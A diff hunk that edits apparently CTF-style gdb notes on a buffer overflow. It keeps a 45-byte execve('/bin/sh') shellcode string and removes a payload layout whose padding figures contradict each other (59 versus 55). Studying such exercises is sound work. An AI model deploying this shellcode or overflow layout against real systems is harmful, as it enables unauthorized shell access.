@@ -169,18 +169,10 @@ Breakpoint 3, 0x0804867c in main ()
 (gdb) x/x 0x804a00c + 4
 0x804a010:	0x42424242
 
-The buffer starts at 0x804a00c
-
-We need to write 108 chars to start overwriting
-payload length 108 + 4 : shell_address (4) + shellcode (45) + padding (59) + buffer_address (4)
-
-shell_address: 
+The buffer starts at 0x804a00c.
 
 shellcode: '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' - 45 chars
 
-padding: 'A' * 55
-
-buffer_address: '\x0c\xa0\x04\x08'
 
 //////////////////////////////////////////////
 
